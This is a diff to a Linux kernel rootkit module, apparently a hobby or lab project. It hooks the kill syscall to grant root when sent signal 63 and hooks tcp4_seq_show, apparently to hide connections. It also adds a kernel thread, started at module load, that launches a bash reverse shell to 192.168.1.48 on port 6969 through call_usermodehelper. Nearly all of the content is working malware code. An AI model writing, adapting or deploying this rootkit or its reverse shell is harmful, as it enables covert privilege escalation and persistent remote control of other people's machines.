@@ -6,8 +6,14 @@
 #include <linux/dirent.h>
 #include <linux/version.h>
 #include <linux/tcp.h>
+#include <linux/net.h>
+#include <linux/socket.h>
+#include <linux/in.h>
+#include <linux/inet.h>
 #include "ftrace_helper.h"
-
+#include <net/sock.h>
+#include <linux/kthread.h>
+#include <linux/sched.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Joseph Fabrello");
@@ -18,7 +24,8 @@ MODULE_VERSION("1.0");
 //char hidePid[NAME_MAX];
 int short hiddenFromLS = 0;
 static struct list_head *prevModule;
-
+static int serverSocket;
+static struct task_struct *my_kernel_thread;
 //static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 //static asmlinkage long (*orig_getdents)(const struct pt_regs *);
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
@@ -56,7 +63,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
 
 		};
 
-	} else if (sig == 128) {
+	} else if (sig == 63) {
 		// giving root
 		giveRoot();
 		return 0;
@@ -112,17 +119,28 @@ void giveRoot(void) {
 };
 
 
-// create a listener on init and hide it straight after
-/*void createListener(void) {
+static int my_execve_thread(void *data) {
+    char *const argv[] = {"/bin/bash","-c", "/bin/bash -i > /dev/tcp/192.168.1.48/6969 0>&1", NULL};
+    char *const envp[] = {NULL};
+    int ret = 0;
 
-	char command[256];
-	
-	sprintf(command, "nc -lnvp 6969");
+    pr_info("Starting user process from kernel thread...\n");
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 
-	int result = system(command);
+    pr_info("User process returned with status %d\n", ret);
+    return 0;
+}
 
+static void startBashThread(void) {
+    pr_info("Initializing kernel module...\n");
+    my_kernel_thread = kthread_run(my_execve_thread, NULL, "my_execve_thread");
 
-};*/
+    if (IS_ERR(my_kernel_thread)) {
+        pr_err("Failed to create kernel thread\n");
+    };
+
+};
+
 
 
 
@@ -130,21 +148,21 @@ static struct ftrace_hook hooks[] = {
 
 	HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
-
 };
 
 static int __init start(void) {
 
 	void createlistener(void);
 	void hideLS(void);
+	void startBashThread(void);
 	int err;
 
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	printk(KERN_INFO "ROOTKIT INSTALLED\n");
 	if (err) return err;
 
-	//createListener();
-	hideLS();
+	startBashThread();
+
 	return 0;
 };
 
